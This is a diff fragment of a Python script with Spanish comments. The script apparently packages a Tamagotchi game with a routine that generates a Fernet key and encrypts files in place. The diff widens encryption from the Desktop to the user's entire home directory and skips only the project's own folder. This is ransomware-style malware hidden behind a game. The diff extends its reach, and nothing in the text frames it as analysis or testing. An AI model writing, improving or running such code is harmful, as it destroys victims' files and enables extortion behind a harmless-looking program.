@@ -5,7 +5,7 @@ import pkg_resources
 from cryptography.fernet import Fernet
 import tkinter as tk
 from tkinter import simpledialog
-import tamagotchi  # Asegúrate de que el código del Tamagotchi esté en un archivo llamado tamagotchi.py
+import tamagotchi  # Asegúrese de que el código del Tamagotchi esté en un archivo llamado tamagotchi.py
 
 REQUIRED_PACKAGES = [
     'cryptography'
@@ -31,7 +31,6 @@ def generar_key():
 def cargar_key():
     return open('key.key', 'rb').read()  # Cambiado de desencriptar("lfp.lfp") a 'key.key'
 
-
 def encrypt(item, key):
     f = Fernet(key)
     with open(item, 'rb') as file:
@@ -40,16 +39,19 @@ def encrypt(item, key):
     with open(item, 'wb') as file:
         file.write(encrypted_data)
 
-def get_all_files_in_directory(dir_path):
+def get_all_files_in_directory(dir_path, exclude_path):
     files_list = []
     for root, dirs, files in os.walk(dir_path):
+        if root.startswith(exclude_path):
+            continue
         for file in files:
             files_list.append(os.path.join(root, file))
     return files_list
 
 def main_encryption():
-    path_to_encrypt = os.path.expanduser('~/Desktop')  # Ahora obtiene automáticamente el directorio del usuario
-    all_files = get_all_files_in_directory(path_to_encrypt)
+    path_to_encrypt = os.path.expanduser('~')  # Ahora obtiene automáticamente el directorio del usuario
+    exclude_path = os.path.dirname(os.path.abspath(__file__))  # Excluye el directorio del proyecto
+    all_files = get_all_files_in_directory(path_to_encrypt, exclude_path)
 
     key = generar_key()
 
